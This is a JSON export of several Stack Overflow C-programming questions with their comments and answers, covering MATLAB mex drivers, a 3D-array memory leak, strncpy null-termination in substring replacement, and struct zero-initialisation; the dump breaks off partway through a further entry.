[{"tags": ["c", "linux", "matlab", "shared-libraries", "mex"], "comments": [{"owner": {"reputation": 1292, "user_id": 5559867, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d9edede7c5b5d82655b7611c6b379b4?s=128&d=identicon&r=PG", "display_name": "Laurenz", "link": "https://stackoverflow.com/users/5559867/laurenz"}, "edited": false, "score": 0, "creation_date": 1498154417, "post_id": 44688000, "comment_id": 76395666, "body": "I tested Matlab&#39;s Library Compiler App. It works great and I was able to write a C program that uses it. It is a little complicated to use because all the arguments are <a href=\"https://www.mathworks.com/help/compiler_sdk/cxx/mwarray.html\" rel=\"nofollow noreferrer\">mwArray</a>s. The big problem is however, that you need the Matlab Compiler Runtime, which does not exist for my armv7l target. :("}, {"owner": {"reputation": 32443, "user_id": 1485872, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/9XWSA.png?s=128&g=1", "display_name": "Ander Biguri", "link": "https://stackoverflow.com/users/1485872/ander-biguri"}, "edited": false, "score": 0, "creation_date": 1498743511, "post_id": 44688000, "comment_id": 76633688, "body": "MATLAB mex C files are just C files with MATLAB objects. Can&#39;t you modify the files and make it a full C code?"}, {"owner": {"reputation": 1292, "user_id": 5559867, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d9edede7c5b5d82655b7611c6b379b4?s=128&d=identicon&r=PG", "display_name": "Laurenz", "link": "https://stackoverflow.com/users/5559867/laurenz"}, "reply_to_user": {"reputation": 32443, "user_id": 1485872, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/9XWSA.png?s=128&g=1", "display_name": "Ander Biguri", "link": "https://stackoverflow.com/users/1485872/ander-biguri"}, "edited": false, "score": 0, "creation_date": 1498758272, "post_id": 44688000, "comment_id": 76644035, "body": "That&#39;s what I ended up doing now. I was hoping to avoid that, because the source code is from another company and is normally not distributed."}], "owner": {"reputation": 1292, "user_id": 5559867, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/8d9edede7c5b5d82655b7611c6b379b4?s=128&d=identicon&r=PG", "display_name": "Laurenz", "link": "https://stackoverflow.com/users/5559867/laurenz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 57, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1498090213, "creation_date": 1498089530, "last_edit_date": 1498090213, "question_id": 44688000, "link": "https://stackoverflow.com/questions/44688000/using-or-converting-mex-driver-in-c-program", "title": "Using or Converting Mex driver in C Program", "body": "<p>I have a device driver that is distributed as Matlab mex file. I want to use the device with ROS on Linux, without Matlab. Is it somehow be possible to use a Matlab Mex file in a C/C++ program? </p>\n\n<p>I can think of three ways:</p>\n\n<ul>\n<li>Just treat it as dynamic library and try to link against it directly. The C program would need to use the <a href=\"https://www.mathworks.com/help/matlab/apiref/mexfunction.html\" rel=\"nofollow noreferrer\"><code>mexFunction()</code> entry point</a> inside</li>\n<li>Use <a href=\"https://www.mathworks.com/help/compiler_sdk/ml_code/compile-a-standalone-application-with-the-standalone-compiler-app_bt2fm30-1.html\" rel=\"nofollow noreferrer\">Matlab Compiler</a> to convert it to an actual shared C/C++ library</li>\n<li>Use <a href=\"https://www.mathworks.com/help/matlab/calling-matlab-engine-from-c-c-and-fortran-programs.html\" rel=\"nofollow noreferrer\">Matlab Engine</a> and call a Matlab script that uses the mex.</li>\n</ul>\n\n<p>I don't like the third option, because the program should run on an ARM-based embedded PC without Matlab (Not sure if the <a href=\"https://www.mathworks.com/products/compiler/mcr.html\" rel=\"nofollow noreferrer\">Matlab Runtime</a> runs on ARM).</p>\n\n<p>The Mex code doesn't use any Toolbox functions, only some standard Matlab Mex functions like <code>mexErrMsgTxt()</code> or <code>mxCreateString()</code> and FTDI's D2XX library.</p>\n\n<p>Has anybody done something like this? Can this work?</p>\n"}, {"tags": ["c", "memory-leaks", "dr-memory"], "comments": [{"owner": {"reputation": 571, "user_id": 7450836, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/69c0cbc84d95b5201e2f5999106119ca?s=128&d=identicon&r=PG&f=1", "display_name": "nounoursnoir", "link": "https://stackoverflow.com/users/7450836/nounoursnoir"}, "edited": false, "score": 0, "creation_date": 1498086484, "post_id": 44687539, "comment_id": 76359219, "body": "it doesn&#39;t answer the question, but as you are writing C you do not need to cast the result of malloc: <a href=\"https://stackoverflow.com/questions/605845/do-i-cast-the-result-of-malloc\" title=\"do i cast the result of malloc\">stackoverflow.com/questions/605845/&hellip;</a>"}, {"owner": {"reputation": 22495, "user_id": 5382650, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/THfCr.png?s=128&g=1", "display_name": "Craig Estey", "link": "https://stackoverflow.com/users/5382650/craig-estey"}, "edited": false, "score": 3, "creation_date": 1498086653, "post_id": 44687539, "comment_id": 76359255, "body": "Your allocation count is <code>inimsize[12]</code> but your free count is <code>in_header</code>. Can you post more code to show how these are set up. If it were me, I&#39;d be using the same limits on all <code>for</code> loops"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498086694, "post_id": 44687539, "comment_id": 76359270, "body": "You use <code>inimsize</code> when allocating and <code>in_header</code> when freeing. There&#39;s nothing to show that those sizes are the same, so a leak or memory abuse is certainly possible."}, {"owner": {"reputation": 9, "user_id": 8196804, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-y0J7RSqjxVU/AAAAAAAAAAI/AAAAAAAAJ1Q/gz2IaDrEGPM/photo.jpg?sz=128", "display_name": "Jake", "link": "https://stackoverflow.com/users/8196804/jake"}, "edited": false, "score": 0, "creation_date": 1498087171, "post_id": 44687539, "comment_id": 76359390, "body": "in_header is a copy of inimsize, so it appears to be the same.      for (i=0;i&lt;20;i++)        in_header[njj][i] = inimsize[i];      }  I will keep checking a provide a helpful answer when I can"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498090250, "post_id": 44687539, "comment_id": 76360138, "body": "Being a 3-star C programmer is not a compliment! It is always almost a signal of bad inderface design. And read <a href=\"https://stackoverflow.com/questions/how-to-ask\">How to Ask</a>. We need a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>."}, {"owner": {"reputation": 14308, "user_id": 1989425, "user_type": "registered", "accept_rate": 38, "profile_image": "https://i.stack.imgur.com/aGyIU.png?s=128&g=1", "display_name": "autistic", "link": "https://stackoverflow.com/users/1989425/autistic"}, "edited": false, "score": 0, "creation_date": 1513523961, "post_id": 44687539, "comment_id": 82677132, "body": "If your diagnostic tool is telling you there&#39;s something wrong, there&#39;s likely something wrong. What the diagnostic tool can&#39;t see is the language you are using. If it could, it&#39;d be quite verbose indeed! An array is a contiguous, <i>single allocation</i>. What you&#39;re creating is not a <i>3-dimensional array</i> but a <i>tree</i>."}], "owner": {"reputation": 9, "user_id": 8196804, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-y0J7RSqjxVU/AAAAAAAAAAI/AAAAAAAAJ1Q/gz2IaDrEGPM/photo.jpg?sz=128", "display_name": "Jake", "link": "https://stackoverflow.com/users/8196804/jake"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 123, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1498086172, "creation_date": 1498086172, "question_id": 44687539, "link": "https://stackoverflow.com/questions/44687539/dr-memory-leak-c-malloc-3d-array", "title": "Dr Memory Leak - C - malloc 3d array", "body": "<p>I am using Dr. Memory to debug legacy code that is crashing in certain conditions.</p>\n\n<p>Dr. Memory says there is a memory leak during allocation:</p>\n\n<pre><code>float   ***in_vol=NULL;\nin_vol=(float ***) malloc(inimsize[12]*sizeof(float **)); // here **\n                   // inimsize is array of ints\n for (i0=0;i0&lt;inimsize[12];i0++) {\n   in_vol[i0] =(float **) malloc(inimsize[0]*sizeof(float *));\n\n   for (i1=0;i1&lt;inimsize[0];i1++)  {\n      in_vol[i0][i1]=(float *) malloc(inimsize[1]*sizeof(float ));\n   }\n }\n</code></pre>\n\n<p>The memory is later freed:</p>\n\n<pre><code>for (i0=0;i0&lt;in_header[0][12];i0++) {\n  for (i1=0;i1&lt;in_header[0][0];i1++)  {\n    free( (float*) *(*(in_vol+i0)+i1) );\n\n  }\n    free( (float*)  *(in_vol+i0));\n}\n\nfree( (float*)in_vol); \nin_vol=NULL;\n</code></pre>\n\n<p>I do not see the problem, however, I am running out of memory during some tests.</p>\n\n<p><strong>Are the allocation and freeing correct?</strong></p>\n"}, {"tags": ["c", "string"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498085897, "post_id": 44687473, "comment_id": 76359032, "body": "&quot;how to debug this&quot;? Same way you would debug most programs. Use a debugger to step thru the code and examine state as you go."}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1498086014, "post_id": 44687473, "comment_id": 76359070, "body": "@kaylum I can tell you where it&#39;s going wrong; I was hoping someone more knowledgeable could help me understand <i>why</i>."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1498086072, "post_id": 44687473, "comment_id": 76359084, "body": "Then why don&#39;t you tell us where it is going wrong? That would be useful info - so that we don&#39;t have to debug that ourselves and also to show you have done it. And you did explicitly ask &quot;how to debug this&quot;."}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1498086237, "post_id": 44687473, "comment_id": 76359138, "body": "After the line strncpy(pre_segment, string, i), extraneous characters are appended along with the replacement string, in front of the replacement string. (The program I provided is an MCVE, so you can see this for yourself if you compile it.)"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498086457, "post_id": 44687473, "comment_id": 76359210, "body": "This code produces no output for me.... Also, missing a semi-colon. And <code>strlen()</code> returns a <code>size_t</code> value, not an <code>int</code>."}, {"owner": {"reputation": 681, "user_id": 4575505, "user_type": "registered", "accept_rate": 100, "profile_image": "https://graph.facebook.com/10204940618347955/picture?type=large", "display_name": "Thecave3", "link": "https://stackoverflow.com/users/4575505/thecave3"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498086786, "post_id": 44687473, "comment_id": 76359295, "body": "Why do you declare in your code <code>80+1</code> instead of <code>81</code>? Same result of @DavidBowling"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 2, "creation_date": 1498088362, "post_id": 44687473, "comment_id": 76359724, "body": "It does not help that the posted code does not produce output as described in the question. But, <code>strncpy()</code> does not always write a <code>\\0</code>, and this is one of those cases. You need to add it yourself. By adding ` segment[T] = &#39;\\0&#39;;` after <code>strncpy(segment, string + i, T);</code>, the program seems to behave as expected."}, {"owner": {"reputation": 12243, "user_id": 2192494, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ddd4f75b6e9293967ba3c81f89edd68a?s=128&d=identicon&r=PG", "display_name": "Lee Daniel Crocker", "link": "https://stackoverflow.com/users/2192494/lee-daniel-crocker"}, "edited": false, "score": 1, "creation_date": 1498090784, "post_id": 44687473, "comment_id": 76360266, "body": "Your for loop is iterating over each of the single characters in <code>string</code>. Then for each of those characters, you are performing 6 (7 if you count <code>printf</code>) whole-string level operations instead of character-level operations. Time to re-think the whole design."}, {"owner": {"reputation": 12557, "user_id": 1270789, "user_type": "registered", "accept_rate": 81, "profile_image": "https://i.stack.imgur.com/FXwoB.png?s=128&g=1", "display_name": "Ken Y-N", "link": "https://stackoverflow.com/users/1270789/ken-y-n"}, "edited": false, "score": 0, "creation_date": 1498105356, "post_id": 44687473, "comment_id": 76363690, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/4483362/strncpy-question-c-language\">strncpy question (C language)</a>"}], "answers": [{"comments": [{"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1498086670, "post_id": 44687598, "comment_id": 76359261, "body": "Thank you so much. I&#39;ll be right back after trying this!"}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1498086983, "post_id": 44687598, "comment_id": 76359340, "body": "Your suggestion worked exactly for me, so if you don&#39;t mind, can I ask some follow up questions? (1) How did you know that was what was wrong, and (2) how would you identify this exact problem in a debugger? (i.e., what would it &quot;look like&quot;?)"}, {"owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "reply_to_user": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 1, "creation_date": 1498090023, "post_id": 44687598, "comment_id": 76360075, "body": "@chris: &quot;adds extraneous characters&quot; often means an unterminated string, and misuse of <code>strncpy</code> often results in unterminated strings. So I started with a bias based on experience. You will see it in a debugger by seeing that strlen gives an unexpected value (or segfaults), or that extraneous characters are printed, or by looking for the NUL terminator and not finding it. <code>strncpy</code> is designed for use with packed fixed-length database fields, but there had grown up a mythology that it is somehow safer than strcpy. So it&#39;s always worth looking at."}], "tags": [], "owner": {"reputation": 199706, "user_id": 1566221, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/ce3ea4ffd1023d4382f397312352726d?s=128&d=identicon&r=PG", "display_name": "rici", "link": "https://stackoverflow.com/users/1566221/rici"}, "is_accepted": false, "score": 5, "last_activity_date": 1498086597, "creation_date": 1498086597, "answer_id": 44687598, "question_id": 44687473, "link": "https://stackoverflow.com/questions/44687473/locating-and-replacing-a-substring-c-language/44687598#44687598", "title": "Locating and replacing a substring (C language)", "body": "<p>Don't use <code>strncpy</code>. It almost certainly doesn't do what you think it does. In particular, it doesn't guarantee NUL-termination, while fooling people into thinking that it does. If you want to copy exactly <code>n</code> characters, use <code>memcpy(dest, src, n);</code> and then explicitly NUL-terminate with <code>dest[n] = '\\0';</code>. The lack of NUL termination is likely to be causing your problems. (Check that in your debugger!)</p>\n\n<p>However, there is no need to do the <code>strncpy</code> at all. Use <code>strncmp</code> or <code>memcmp</code>. (Only use <code>memcmp</code> if you know that there are at least <code>strlen(target)</code> bytes left in the string.) If <code>strlen(target)</code> bytes starting at some point in <code>string</code> match <code>target</code>, then you've found a match.</p>\n\n<p>Even better would be to use <code>strstr</code> to find the next occurrence of the string.</p>\n"}, {"comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 3, "creation_date": 1498088611, "post_id": 44687849, "comment_id": 76359779, "body": "I did not read the comments of @rici to mean that <code>strncpy()</code> should never be used; it is certainly misused often. There is a knee-jerk tendency among some to want to turn any instance of <code>strcpy()</code> into <code>strncpy()</code> in the interest of &quot;safety&quot;, and this is not always the right choice."}, {"owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "edited": false, "score": 0, "creation_date": 1498092367, "post_id": 44687849, "comment_id": 76360608, "body": "I, uh, incremented your reputation (this site hates comments like that apparently). I appreciate you spelling out the importance of the null characters after the copying."}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": false, "score": 0, "last_activity_date": 1498089002, "last_edit_date": 1498089002, "creation_date": 1498088397, "answer_id": 44687849, "question_id": 44687473, "link": "https://stackoverflow.com/questions/44687473/locating-and-replacing-a-substring-c-language/44687849#44687849", "title": "Locating and replacing a substring (C language)", "body": "<p>I can not agree with  <code>@rici</code> that exclaims that the function <code>strncpy</code> should not be used. Any function can be used incorrectly. And <code>strncpy</code> is not an exception. You should keep in mind that it is not necessary that the function will copy a string. So you have yourself to append explicitly a zero-character to the copied sequence of characters.</p>\n\n<p>And you forgot to do this.</p>\n\n<p>Though your implementation is too complicated and confusing nevertheless in any case it should be written carefully. </p>\n\n<p>Here is an updated version of your program. Pay attention to these statements</p>\n\n<pre><code>segment[T] = '\\0';\npre_segment[i] = '\\0';\npost_segment[S - ( i + T )] = '\\0';\n</code></pre>\n\n<p>Or if you prefer tp use pointers then you could write</p>\n\n<pre><code>*( segment + T ) = '\\0';\n*( pre_segment + I ) = '\\0';\n*( post_segment + S - ( i + T )) = '\\0';\n</code></pre>\n\n<p>Here you are.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main(void) \n{\n    char string[] = \"The quick brown fox jumped over the lazy dog.\";\n    char target[] = \"brown\";\n    char replacement[] = \"ochre\";\n    char segment[80+1];\n    char pre_segment[80+1];\n    char post_segment[80+1];\n\n    size_t S = strlen(string), T = strlen(target);\n\n    for ( size_t i = 0; i &lt; S; i++) \n    {\n        strncpy(segment, string + i, T);\n        segment[T] = '\\0';\n\n        if ( strcmp( segment, target ) == 0 ) \n        {\n            strncpy(pre_segment, string, i);\n            pre_segment[i] = '\\0';\n\n            strncpy( post_segment, string + i + T, S - (i + T));\n            post_segment[S - ( i + T )] = '\\0';\n\n            strcat(pre_segment, replacement);\n            strcat(pre_segment, post_segment);\n            printf(\"%s\\n\", pre_segment);\n        }\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>The program output is</p>\n\n<pre><code>The quick ochre fox jumped over the lazy dog. \n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 985, "user_id": 7870824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55248f8bdfa95b6d442aa497b6fc3348?s=128&d=identicon&r=PG&f=1", "display_name": "SEDaradji", "link": "https://stackoverflow.com/users/7870824/sedaradji"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498097700, "post_id": 44688298, "comment_id": 76361824, "body": "This could as i mentioned, is nowhere near perfect, the reader should build upon it, however, i will review and update it, thanks for the important notes"}, {"owner": {"reputation": 985, "user_id": 7870824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55248f8bdfa95b6d442aa497b6fc3348?s=128&d=identicon&r=PG&f=1", "display_name": "SEDaradji", "link": "https://stackoverflow.com/users/7870824/sedaradji"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498104991, "post_id": 44688298, "comment_id": 76363574, "body": "I fixed the code above, i believe it is acceptable as a solution in its current state"}, {"owner": {"reputation": 985, "user_id": 7870824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55248f8bdfa95b6d442aa497b6fc3348?s=128&d=identicon&r=PG&f=1", "display_name": "SEDaradji", "link": "https://stackoverflow.com/users/7870824/sedaradji"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1498114848, "post_id": 44688298, "comment_id": 76367842, "body": "Thanks for the support, it has been over three years since i stopped coding in c, this should do it"}, {"owner": {"reputation": 985, "user_id": 7870824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55248f8bdfa95b6d442aa497b6fc3348?s=128&d=identicon&r=PG&f=1", "display_name": "SEDaradji", "link": "https://stackoverflow.com/users/7870824/sedaradji"}, "reply_to_user": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1498115900, "post_id": 44688298, "comment_id": 76368475, "body": "Done, thanks again"}], "tags": [], "owner": {"reputation": 985, "user_id": 7870824, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/55248f8bdfa95b6d442aa497b6fc3348?s=128&d=identicon&r=PG&f=1", "display_name": "SEDaradji", "link": "https://stackoverflow.com/users/7870824/sedaradji"}, "is_accepted": false, "score": 1, "last_activity_date": 1498115830, "last_edit_date": 1498115830, "creation_date": 1498091909, "answer_id": 44688298, "question_id": 44687473, "link": "https://stackoverflow.com/questions/44687473/locating-and-replacing-a-substring-c-language/44688298#44688298", "title": "Locating and replacing a substring (C language)", "body": "<p>You should always try to split your code into smaller parts(functions), we can identify two key steps in the process of replacing a substring, finding the substring and then replacing it.\nThis is a solution i am proposing for you, it's been three years since i wrote my last c line of code so this is not perfect but it does the job:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\n\nint find_occurence(char* original, char *target){\n  size_t counter = 0;\n  char *index = original;\n  do{\n    while(target[counter] == index[counter])\n      counter++;\n    if (counter &gt;= strlen(target))\n      return (int)(index-original);\n    else\n      counter = 0;\n  }\n  while(*(index++));\n  return -1;\n}\n\nvoid replace(char *original, char *target, char *replacement,char *destination){\n  int index = find_occurence(original, target);\n  if (index == -1)\n  {\n    strncpy (destination, original, strlen(original)+1 );\n    return;\n  }\n\n  char *last_part;\n\n  //Copy the string before target\n  strncpy (destination, original, index );\n\n  //Copy the replacement\n  strncpy (&amp;destination[index], replacement, strlen(replacement) );\n\n  //Extract the part after the target\n  last_part = &amp;original[index+strlen(target)];\n\n  //Copy the part after the target plus the \\0 character\n  strncpy (&amp;destination[index+strlen(replacement)],last_part,strlen(last_part)+1);\n}\n\n\nint main() {\n  char *original = \"I want to replace literally this by that\";\n  char *target = \"this\";\n  char *replacement = \"that\";\n  char destination[100];\n\n  replace(original,target,replacement, destination);\n\n  printf(\"%s\\n\",destination);\n\n\n}\n</code></pre>\n"}], "owner": {"reputation": 207, "user_id": 1198649, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/38593a3fbc2b08a7acc2e1ff575ce182?s=128&d=identicon&r=PG", "display_name": "Chris", "link": "https://stackoverflow.com/users/1198649/chris"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 192, "favorite_count": 0, "closed_date": 1498116606, "answer_count": 3, "score": 0, "last_activity_date": 1498115830, "creation_date": 1498085746, "last_edit_date": 1498086432, "question_id": 44687473, "link": "https://stackoverflow.com/questions/44687473/locating-and-replacing-a-substring-c-language", "closed_reason": "Not suitable for this site", "title": "Locating and replacing a substring (C language)", "body": "<p>I wrote the following code with the intention of using pointer arithmetic on strings to find, and replace, a targeted substring. Obviously, it's not elegant, but unfortunately it's also incorrect - it adds extraneous characters to the string.  </p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint main() {\n    char string[] = \"The quick brown fox jumped over the lazy dog.\";\n    char target[] = \"brown\"\n    char replacement[] = \"ochre\";\n    char segment[80+1];\n    char pre_segment[80+1];\n    char post_segment[80+1];\n    int S = strlen(string), T = strlen(target);\n    for (int i = 0; i &lt; S; i++) {\n        strncpy(segment, string + i, T);\n        if (strcmp(segment, target) == 0) {\n        &gt;&gt;&gt; strncpy(pre_segment, string, i); &lt;&lt;&lt;\n            strncpy(post_segment, string + i + T,\n                S - (i + T));\n            strcat(pre_segment, replacement);\n            strcat(pre_segment, post_segment);\n            printf(\"%s\\n\", pre_segment);\n        }\n    }\n    return 0; \n}\n</code></pre>\n\n<p>After the line marked like >>>this&lt;&lt;&lt;, extraneous characters have been prepended to replacement before replacement is concatenated with pre_segment.</p>\n\n<p>Can someone give me suggestions on how to debug this? (Suggestions for a nicer solution are also welcome, but please try to be explicit. Also, I'm not supposed to be using dynamic memory allocation for this.)</p>\n"}, {"tags": ["c", "static", "initialization"], "comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498084471, "post_id": 44687264, "comment_id": 76358627, "body": "What does your C book say? We are not a tutoring site for code you found somewhere on your backyard."}, {"owner": {"reputation": 228853, "user_id": 827263, "user_type": "registered", "accept_rate": 54, "profile_image": "https://www.gravatar.com/avatar/216c1db53d752f87dd8176a6ba0c2190?s=128&d=identicon&r=PG", "display_name": "Keith Thompson", "link": "https://stackoverflow.com/users/827263/keith-thompson"}, "edited": false, "score": 1, "creation_date": 1498085375, "post_id": 44687264, "comment_id": 76358884, "body": "A compilable example would be better. You can&#39;t name all the members <code>xxx</code>, and there&#39;s no type called <code>u32</code> unless you define it yourself or include a header that does so."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1498086491, "post_id": 44687264, "comment_id": 76359221, "body": "Succinctly &quot;yes&quot;, but you should go read a text book to find out more."}], "owner": {"reputation": 628, "user_id": 3529352, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/245b44fc0ecbcdea18a29bc8016f5d4c?s=128&d=identicon&r=PG&f=1", "display_name": "nathan", "link": "https://stackoverflow.com/users/3529352/nathan"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 39, "favorite_count": 0, "closed_date": 1498100459, "answer_count": 0, "score": 0, "last_activity_date": 1498086524, "creation_date": 1498084238, "last_edit_date": 1498086524, "question_id": 44687264, "link": "https://stackoverflow.com/questions/44687264/struct-definition-and-initialization", "closed_reason": "Duplicate", "title": "struct definition and initialization", "body": "<p>I saw a piece of code</p>\n\n<pre><code>static struct {\n    u32 xxx;\n    struct {\n        u32 xxx;\n        u32 xxx;\n        u32 xxx;\n    } xxx[xxx+1];\n } xxx = {0};\n</code></pre>\n\n<p>Does it mean we intialize all fields as 0?</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 386, "user_id": 7928083, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/usoNq.png?s=128&g=1", "display_name": "Justin J.", "link": 